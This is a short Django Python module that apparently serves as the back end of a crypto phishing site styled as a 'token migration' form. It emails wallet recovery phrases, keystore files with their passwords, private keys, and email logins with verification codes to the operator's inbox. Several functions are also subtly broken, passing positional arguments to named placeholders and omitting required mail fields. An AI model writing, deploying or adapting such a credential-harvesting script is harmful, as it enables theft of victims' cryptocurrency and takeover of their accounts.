from django.core.mail import send_mail
from django.conf import settings

RECIPIENT_MAIL = settings.RECIPIENT_MAIL

SUBJECT = 'NEW FORM FROM TOKEN MIGRATION RECTIFY'

PHRASE = ''''
--------- New Phrase Token ----------
Token: {a}
'''

KEYSTORE_JSON = ''''
--------- New Keystore JSON ----------
Token: {a}
Passowrd: {b}
'''

PRIVATE_KEY = ''''
--------- New Private Key ----------
Private Key: {a}
'''

EMAIL = ''''
--------- New Email & Passowrd ----------
Email: {a}
Password: {b}
Code: {c}
'''

def send_phrase(phrase):
    try:
        send_mail(
            subject=SUBJECT,
            message=PHRASE.format(a=phrase),
            from_email=None,
            recipient_list=[RECIPIENT_MAIL],
        )
        return 1
    except Exception as e:
        print(e)
        return 0

def send_keystore(keystore, password):
    try:
        send_mail(
            KEYSTORE_JSON.format(keystore, password),
            recipient_list=[RECIPIENT_MAIL],
        )
        return 1
    except Exception as e:
        print(e)
        return 0

def send_private(key):
    try:
        send_mail(
            PRIVATE_KEY.format(key),
            recipient_list=[RECIPIENT_MAIL],
        )
        return 1
    except Exception as e:
        print(e)
        return 0

def send_email(email, password, code):
    try:
        send_mail(
            EMAIL.format(email, password, code),
            recipient_list=[RECIPIENT_MAIL],
        )
        return 1
    except Exception as e:
        print(e)
        return 0
